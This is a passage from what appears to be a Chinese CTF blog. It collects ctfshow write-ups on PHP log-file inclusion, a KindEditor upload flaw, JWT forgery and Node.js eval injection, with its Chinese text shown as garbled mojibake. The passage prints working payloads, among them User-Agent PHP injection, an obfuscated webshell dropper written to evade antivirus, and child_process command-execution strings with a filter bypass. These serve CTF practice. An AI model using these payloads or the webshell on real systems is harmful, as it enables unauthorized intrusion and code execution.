alt="image-20230202231836152"></p><p>æ‰«æåå°æ‰«å‡ºä¸€ä¸ª/installåå°å®‰è£…ç›®å½•</p><p>ç„¶åè®¿é—®ï¼Œé€šè¿‡æç¤ºé‡ç½®åå°ç®¡ç†å‘˜å¯†ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç™»å½•åå°äº†</p><p>admin/admin888   (ä¸Šé¢çš„é¢˜å¾—å‡ºçš„ç»“è®º)</p><h2 id="web386-é…ç½®æ–‡ä»¶åˆ©ç”¨"><a href="#web386-é…ç½®æ–‡ä»¶åˆ©ç”¨" class="headerlink" title="web386(é…ç½®æ–‡ä»¶åˆ©ç”¨)"></a>web386(é…ç½®æ–‡ä»¶åˆ©ç”¨)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230202235025560.png" alt="image-20230202235025560"></p><p>é€šè¿‡æ‰«æåå°å‘ç°install</p><p>clear.phpæ—¶çœ‹æºç æ—¶å‘ç°çš„</p><p><img src="../images/image-20230205192730195.png" alt="image-20230205192730195"></p><p>ç”±äºè¿™é‡Œå’Œä¸Šé¢çš„ä¸ä¸€æ ·ï¼Œæ‰€ä»¥å°±è€ƒè™‘ä¸€ä¸‹å»è®¿é—®è¿™ä¸ªä½è´¨ï¼Œå¹¶æŠŠalsckdfyç»™å»æ‰ï¼Œè®¿é—®åé¢çš„</p><p><img src="../images/image-20230205192901028.png" alt="image-20230205192901028"></p><p>å‡ºç°ä¸€ä¸ªå‹ç¼©è¿‡çš„æ–‡ä»¶å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æŠŠè¿™ä¸ªç»™è§£å‹ç¼©ä¸‹æ¥æŸ¥çœ‹</p><p><strong>å‹ç¼©è„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://f50cd95d-d7d9-4454-802e-3cd1b681e803.challenge.ctf.show/layui/css/tree.css&#x27;</span></span><br><span class="line">html = requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(html.cont</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230205193156553.png" alt="image-20230205193156553"></p><p>è¿›è¡Œè§£ç åå‘ç°å­˜åœ¨clear.phpæ–‡ä»¶ï¼Œè¿™å°±æ˜¯å‘ç°clear.phpçš„è¿‡ç¨‹</p><p>ç„¶åå°±å»è®¿é—®install</p><p><img src="../images/image-20230203002152913.png" alt="image-20230203002152913"></p><p>å­˜åœ¨locké”å®šç¨‹åºï¼Œä¸èƒ½è¿›è¡Œå¯†ç é‡ç½®äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—æƒ³åŠæ³•å»åˆ é™¤è¿™ä¸ªç¨‹åºï¼Œç„¶åè¿™é‡Œå°±æœ‰ä¸€ä¸ªclear.phpæ²¡ç”¨åˆ°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•å»ç”¨ä»–ã€‚</p><p><img src="../images/image-20230203002311775.png" alt="image-20230203002311775"></p><p>å°±è¯´æ¸…ç†å®Œæˆï¼Œä½†ä¸çŸ¥æ¸…ç†äº†å•¥ï¼Œé‚£æˆ‘ä»¬å°±å¾—è€ƒè™‘ä¸€ä¸‹æ¸…ç†çš„å‚æ•°æ˜¯å•¥ï¼Œç›²çŒœä¸€æ³¢file,å°è¯•æ¸…ç†index.phpçœ‹çœ‹ã€‚</p><p><img src="../images/image-20230203002537481.png" alt="image-20230203002537481"></p><p>è¢«æ¸…ç†æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•æŠŠlock.batä¹Ÿç»™æ¸…ç†æ‰</p><p><img src="../images/image-20230203002721549.png" alt="image-20230203002721549"></p><p>æˆåŠŸæ¸…ç†æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é‡ç½®å¯†ç ï¼Œç„¶åç™»å½•åå°äº†</p><p>é»˜è®¤å¯†ç  admin/admin888</p><h2 id="web387-æ—¥å¿—æ–‡ä»¶åŒ…å«-ç¼–è¾‘å™¨"><a href="#web387-æ—¥å¿—æ–‡ä»¶åŒ…å«-ç¼–è¾‘å™¨" class="headerlink" title="web387(æ—¥å¿—æ–‡ä»¶åŒ…å«  ç¼–è¾‘å™¨)"></a>web387(æ—¥å¿—æ–‡ä»¶åŒ…å«  ç¼–è¾‘å™¨)</h2><p>é¢˜ç›®</p><p>è¿™é‡Œçš„è¯æ—¶ä¸ç»™åˆ é™¤é”å®šæ–‡ä»¶äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ¢ä¸ªæ€è·¯ï¼ŒæŸ¥çœ‹æºç ï¼Œçœ‹æœ‰æ²¡æœ‰å•¥æ–°çš„ä¸œè¥¿è¿›è¡Œæ³„éœ²ã€‚</p><p><img src="../images/image-20230205193922017.png" alt="image-20230205193922017"></p><p>å‘ç°ä¸€ä¸ªè·¯å¾„å¾ˆæƒ³ç¼–è¾‘å™¨çš„è·¯å¾„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¿›è¡Œè®¿é—®ç¼–è¾‘å™¨è·¯å¾„çœ‹çœ‹ã€‚</p><p><img src="../images/image-20230205194048868.png" alt="image-20230205194048868"></p><p>å‘ç°ç¡®å®å­˜åœ¨è¿™ä¸ªç¼–è¾‘å™¨</p><p><img src="../images/image-20230205194132606.png" alt="image-20230205194132606"></p><p>ç„¶åå‘ç°æ˜¯ä¸ª4.1.11ç‰ˆæœ¬çš„ï¼Œè¿™ä¸ªç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ªä¸Šä¼ htmlçš„æ¼æ´ï¼Œä½†æ˜¯è¿™é‡Œä¸èƒ½ä¸Šä¼ phpä»£ç ï¼Œå› ä¸ºæºç é‡Œé»˜è®¤æ—¶é˜»æ­¢çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¾—å»çœ‹ä¸€ä¸‹åˆ«çš„æ€è·¯</p><p>ä½†æ˜¯è¿™é‡Œæ˜¯å¯ä»¥ç›´æ¥ä¸Šä¼ å›¾ç‰‡å’Œå‹ç¼©åŒ…çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨å‹ç¼©åŒ…é‡Œå†™å…¥phpä»£ç ç„¶åè¿›è¡Œä¸Šä¼ ï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚</p><p>ç„¶å æ‰«ç›®å½•æ‰«æ‰«åˆ°ä¸€ä¸ªrobots.txt</p><p><img src="../images/image-20230205194644640.png" alt="image-20230205194644640"></p><p>å‘ç°ä¸€ä¸ª<strong>/debug</strong>è·¯å¾„</p><p><img src="../images/image-20230205194935811.png" alt="image-20230205194935811"></p><p><img src="../images/image-20230205195546158.png" alt="image-20230205195546158"></p><p>æˆåŠŸæ‰§è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•ä¸€ä¸‹æ—¥å¿—æ–‡ä»¶åŒ…å«è¯•ä¸€è¯•</p><p>è¿™é‡Œå°è¯•è¿‡å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå‘ç°æ‰§è¡Œä¸äº†ï¼Œæ‰€ä»¥è¿™é‡Œå¯èƒ½æ˜¯ä¸å¯ä»¥ä¼ å‚æ•°ï¼Œåªèƒ½åœ¨UAå¤„è¿›è¡Œä»£ç æ‰§è¡Œ</p><p><strong>ç¬¬ä¸€æ­¥</strong></p><p>åœ¨uaå¤„å†™å…¥ <code>&lt;?php system(&#39;ls / &gt;/var/www/html/1.txt&#39;);?&gt;</code></p><p><img src="../images/image-20230205200136409.png" alt="image-20230205200136409"></p><p>ç„¶ååœ¨/debugåé¢åŠ ä¸Š<code>?file=/var/log/nginx/access.log</code>ç„¶åè®¿é—®ï¼Œæœ€ååœ¨è®¿é—®1.txtå°±å¯ä»¥äº†</p><p><img src="../images/image-20230205200242374.png" alt="image-20230205200242374"></p><p>å‘ç°å¯ä»¥æˆåŠŸå†™å…¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ç›´æ¥æŸ¥çœ‹åå°ç™»å½•æºç å°±è¡Œã€‚</p><p>é‚£ä¹ˆåœ¨uaå¤„å°±å¾—é‡æ–°å†™å…¥ï¼Œå…¶ä»–å’Œä¸Šé¢ä¸€æ ·</p><p>&lt;?php system(â€˜ls /var/www/html/alsckdfy/check.php &gt;/var/www/html/2.txtâ€™);?&gt;</p><p><img src="../images/image-20230205200708305.png" alt="image-20230205200708305"></p><p>ç„¶åå°±å¯ä»¥æ‹¿åˆ°flagäº†ã€‚</p><p><strong>è§£æ³•äºŒ</strong></p><p>å› ä¸ºåœ¨uaå¤„å¯ä»¥æ‰§è¡Œphpä»£ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ é™¤æ‰lock.datæ–‡ä»¶ï¼Œç„¶åé‡æ–°å®‰è£…ï¼Œä½¿ç”¨é»˜è®¤å¯†ç ç™»å½•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user-agent:<span class="meta">&lt;?php</span> <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;/var/www/html/install/lock.dat&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web388-CVE-2017-1002024-å…æ€é©¬"><a href="#web388-CVE-2017-1002024-å…æ€é©¬" class="headerlink" title="web388(CVE-2017-1002024/å…æ€é©¬)"></a>web388(CVE-2017-1002024/<strong>å…æ€é©¬</strong>)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230205201200594.png" alt="image-20230205201200594"></p><p>è¿™é‡Œæ˜¯å‘ç°<strong>web377</strong>çš„æ–¹æ³•ç”¨ä¸äº†äº†ï¼Œè¿˜æœ‰è¿™ä¸ªè‡ªå¸¦çš„æ€æ¯’è½¯ä»¶ä¼šæŠŠphpä¸€å¥è¯æœ¨é©¬ç»™è¿‡æ»¤æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—æƒ³æƒ³åˆ«çš„æ–¹æ³•äº†ï¼Œç„¶åä¸Šé¢é¢˜æåˆ°çš„editorè¿˜æ²¡ç”¨åˆ°ï¼Œé‚£ä¹ˆè¿™é¢˜æˆ‘ä»¬å°±å¯ä»¥æ¥å°è¯•ä¸€ä¸‹</p><p>è¿™ä¸ªeditorç‰ˆæœ¬çš„æ¼æ´æ˜¯  <a href="https://wiki.96.mk/Webå®‰å…¨/Kindeditor/ï¼ˆCVE-2017-1002024ï¼‰Kindeditor &lt;%3D4.1.11 ä¸Šä¼ æ¼æ´/">CVE-2017-1002024</a></p><p>è¿™é‡Œæ€ä¹ˆå‘ç°çš„editorä¸Šé¢çš„wpæœ‰è®²</p><p>å†™å…¥ä¸€ä¸ªå…æ€ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/1.php&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å†™å…¥åˆ°txtæ–‡ä»¶ä¸­ï¼Œç„¶åè¿›è¡Œä¸Šä¼ </p><p><img src="../images/image-20230205205012187.png" alt="image-20230205205012187"></p><p>ç„¶åé€šè¿‡<strong>/debug?file=</strong>å‚æ•°ä¼ ç»™æ—¥å¿—æ–‡ä»¶</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/debug/?file=/var/www/html/alsckdfy/attached/file/20230205/20230205124929_21190.txt</span><br></pre></td></tr></table></figure><p>è®¿é—®æ—¥å¿—æ–‡ä»¶ï¼Œæ‰§è¡Œä¸€å¥è¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/debug/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®1.phpè¿›è¡Œrce</p><p>æˆåŠŸå†™å…¥</p><p><img src="../images/image-20230205205243943.png" alt="image-20230205205243943"></p><p><img src="../images/image-20230205205422574.png" alt="image-20230205205422574"></p><h2 id="web389-sessionä¼ªé€ -jwt-æ—¥å¿—æ–‡ä»¶åŒ…å«"><a href="#web389-sessionä¼ªé€ -jwt-æ—¥å¿—æ–‡ä»¶åŒ…å«" class="headerlink" title="web389(sessionä¼ªé€ /jwt/æ—¥å¿—æ–‡ä»¶åŒ…å«)"></a>web389(sessionä¼ªé€ /jwt/æ—¥å¿—æ–‡ä»¶åŒ…å«)</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230205210521806.png" alt="image-20230205210521806"></p><p><img src="../images/image-20230205210544839.png" alt="image-20230205210544839"></p><p>è®¿é—®/debugï¼Œç„¶åæç¤ºæƒé™ä¸è¶³ï¼Œé‚£ä¹ˆå°±æš—ç¤ºæˆ‘ä»¬ä¸æ˜¯ç®¡ç†å‘˜ï¼Œè¿™æ—¶å€™æŸ¥çœ‹ä¸‹cookieï¼Œ</p><p><img src="../images/image-20230205210647871.png" alt="image-20230205210647871"></p><p>å‘ç°æ˜¯eyjhå¼€å¤´çš„ï¼Œé‚£ä¹ˆå°±ä¼šæ¡ä»¶åå°„åˆ°<strong>jwt</strong></p><p><img src="../images/image-20230205213300447.png" alt="image-20230205213300447"></p><p>è¿™é‡Œçš„å¯†é’¥æ˜¯çŒœçš„ï¼Œç„¶åä¿®æ”¹userä¸ºadminå°±å¥½äº†ï¼Œè¿™é‡Œçš„å¯†é’¥æ˜¯123456ï¼Œæ˜¯çŒœå‡ºæ¥çš„ã€‚</p><p><img src="../images/image-20230221214351604.png" alt="image-20230221214351604"></p><p>è¿™ä¸ªè¾“å‡ºå°±æ˜¯ä»£è¡¨ç€å†™å…¥æˆåŠŸã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬ä¼šé€‰æ‹©ä¸Šä¼ ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œé‡Œé¢å¸¦ç€ä¸€ä¸ªæœ¨é©¬(å…æ€ç )</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/1.php&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå»è®¿é—®<code>/debug/?file=/var/www/html/alsckdfy/attached/file/20230221/20230221134621_53294.zip</code></p><p>ç„¶åè®¿é—®1.phpå°±å¯ä»¥è¿›è¡Œrceäº†</p><p><strong>è¿™ä¸ªè¿™ä¸“é¢˜å‰©ä¸‹çš„å†…å®¹å°±ä¸æƒ³å†™äº†ï¼Œå†™javaé¢˜å»äº†</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow é»‘ç›’æµ‹è¯• åˆ·é¢˜è®°å½• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-phpcve åˆ·é¢˜è®°å½•</title>
      <link href="/posts/71eebe5f.html"/>
      <url>/posts/71eebe5f.html</url>
      
        <content type="html"><![CDATA[<p>è¿™ä¸ªphpcveä¸“é¢˜æˆ‘å°±ä¸å†™äº†ï¼Œçœ‹è¿™ä¸ªå¸ˆå‚…çš„wpå°±è¡Œäº†ï¼Œå†™çš„å¾ˆè¯¦ç»†äº†</p><p><a href="https://blog.csdn.net/qq_42880719/article/details/122513194">è¿™ç¯‡æ–‡ç« </a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow phpcve åˆ·é¢˜è®°å½• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-nodejs åˆ·é¢˜è®°å½•</title>
      <link href="/posts/bfd00f80.html"/>
      <url>/posts/bfd00f80.html</url>
      
        <content type="html"><![CDATA[<p>nodejså®˜æ–¹ä¸­æ–‡æ–‡æ¡£ï¼Œä¸æ˜ç™½çš„ä¸œè¥¿å¯ä»¥è¿›å»æŸ¥ <a href="http://nodejs.cn/api">æ–‡æ¡£</a></p><p>è¿™ç¯‡æ–‡ç« å†™çš„å¾ˆå¥½  â€”-&gt;  <a href="https://tari.moe/2021/05/04/ctfshow-nodejs/">nodejsçš„wp</a></p><h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230130180353006.png" alt="image-20230130180353006"></p><p>è¿™é‡Œçš„æŠŠæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œæ·»åŠ åç¼€.zipå°±å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªæ–‡ä»¶åœ¨å‹ç¼©åŒ…é‡Œ</p><p><img src="../images/image-20230130180558359.png" alt="image-20230130180558359"></p><p><strong>user.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">items</span>: [</span><br><span class="line">    &#123;<span class="attr">username</span>: <span class="string">&#x27;CTFSHOW&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>login.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å°±ä¸Šé¢çš„ä»£ç æ—¶è§£é¢˜å…³é”®</p><p>å…¶ä¸­toUpperCase()å‡½æ•°ä¸ºè½¬ä¸ºå¤§å†™  ç”¨æˆ·åä¸èƒ½ä¸ºå¤§å†™</p><p>æ‰€ä»¥payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=ctfshow passwd=123456</span><br></pre></td></tr></table></figure><p><strong>yuå¸ˆå‚…ç»™çš„ä¸€ä¸ªå°trick</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åœ¨<span class="title class_">Character</span>.<span class="title function_">toUpperCase</span>()å‡½æ•°ä¸­ï¼Œå­—ç¬¦Ä±ä¼šè½¬å˜ä¸ºIï¼Œå­—ç¬¦Å¿ä¼šå˜ä¸ºSã€‚</span><br><span class="line">åœ¨<span class="title class_">Character</span>.<span class="title function_">toLowerCase</span>()å‡½æ•°ä¸­ï¼Œå­—ç¬¦Ä°ä¼šè½¬å˜ä¸ºiï¼Œå­—ç¬¦â„ªä¼šè½¬å˜ä¸ºkã€‚</span><br></pre></td></tr></table></figure><h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230130182055210.png" alt="image-20230130182055210"></p><p><strong>åœ¨<a href="https://so.csdn.net/so/search?q=nodejs&amp;spm=1001.2101.3001.7020">nodejs</a>ä¸­ï¼Œeval()æ–¹æ³•ç”¨äºè®¡ç®—å­—ç¬¦ä¸²ï¼Œå¹¶æŠŠå®ƒä½œä¸ºè„šæœ¬ä»£ç æ¥æ‰§è¡Œï¼Œè¯­æ³•ä¸ºâ€œeval(string)â€ï¼›å¦‚æœå‚æ•°ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯æ•´æ•°æˆ–è€…æ˜¯Functionç±»å‹ï¼Œåˆ™ç›´æ¥è¿”å›è¯¥æ•´æ•°æˆ–Functionã€‚</strong></p><p><a href="http://nodejs.cn/api/child_process.html#child_processexecsynccommand-options">è¿™é“é¢˜ç”¨åˆ°çš„æ–¹æ³•</a></p><p>å¯ä»¥å»çœ‹çœ‹ï¼Œå¹¶ä¸éš¾çœ‹æ‡‚</p><p><strong>payload1</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="property">stdout</span>.<span class="title function_">toString</span>();</span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>,[<span class="string">&#x27;fl00g.txt&#x27;</span>]).<span class="property">stdout</span>.<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…ˆæ˜¯ç”¨<strong>requireè°ƒç”¨child_processè¿™æ¨¡å—</strong>ï¼Œç„¶ååœ¨è°ƒç”¨è¿™ä¸ªæ¨¡å—é‡Œé¢çš„å‡½æ•°æ–¹æ³•</p><p><img src="../images/image-20230130190208919.png" alt="image-20230130190208919"></p><p>å‘ç°ä¸€ä¸ªfl00g.txtï¼Œç„¶åç›´æ¥è¯»å–å°±å¥½äº†</p><p><img src="../images/image-20230130190401823.png" alt="image-20230130190401823"></p><p>è¿™ä¸¤ä¸ªpayloadçš„åŒºåˆ«ï¼Œå°±æ˜¯æœ‰æ— <strong>args</strong>çš„åŒºåˆ«ï¼Œè¯¦ç»†çš„è¯å¯ä»¥è‡ªå·±å»ä¸Šé¢ç»™çš„é“¾æ¥é‡Œçœ‹</p><h2 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230130190632098.png" alt="image-20230130190632098"></p><p>æŸ¥çœ‹æºä»£ç åˆå‘ç°æ˜¯<code>eval</code></p><p>è¿™é“é¢˜banäº†<code>exec</code></p><p>é‚£ä¹ˆè¿™ä¸ªpayloadè¿˜èƒ½ç”¨</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="property">stdout</span>.<span class="title function_">toString</span>();</span><br><span class="line"><span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>,[<span class="string">&#x27;fl00g.txt&#x27;</span>]).<span class="property">stdout</span>.<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p><strong>æ–¹æ³•äºŒ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__filename</span><br><span class="line">__dirname</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230130191842257.png" alt="image-20230130191842257"></p><p><img src="../images/image-20230130191908490.png" alt="image-20230130191908490"></p><p>ç®€å•ç‚¹è¯´å°±æ˜¯<code>__filename</code>å°±æ˜¯è¿”å›å½“å‰ç›®å½•çš„æ‰€å¤„çš„å…¨è·¯å¾„ï¼Œ<code>dirname</code>å°±æ˜¯è¿”å›å½“å‰æ–‡ä»¶æ‰€å¤„çš„ä½ç½®ï¼Œä¸åŒ…å«æ–‡ä»¶æœ¬èº«</p><p><img src="../images/image-20230130192136886.png" alt="image-20230130192136886"></p><p>ç„¶åå°±åˆ©ç”¨fsæ¨¡å—é‡Œè¾¹çš„readFileSyncå‡½æ•°è¯»å–æ–‡ä»¶(åœ¨æ–‡ç« å¼€å¤´ç»™çš„æ–‡æ¡£é“¾æ¥é‡Œè¾¹å¯ä»¥æŸ¥åˆ°)</p><p><img src="../images/image-20230130192447476.png" alt="image-20230130192447476"></p><p>å‘ç°è¿‡æ»¤äº†execå’Œload<strong>(æŸ¥çœ‹index.js)</strong>å‘ç°çš„</p><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&#x27;exe&#x27;</span>%2B<span class="string">&#x27;cSync&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„åŠ å·è¦è¿›è¡Œurlç¼–ç ï¼Œå°±æ˜¯ç¼–ç ä¸º%2B(ç±»ä¼¼sstiç”¨[]ç»•è¿‡.)</p><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readdirSync</span>(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;fl001g.txt&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><p>é¢˜ç›®</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  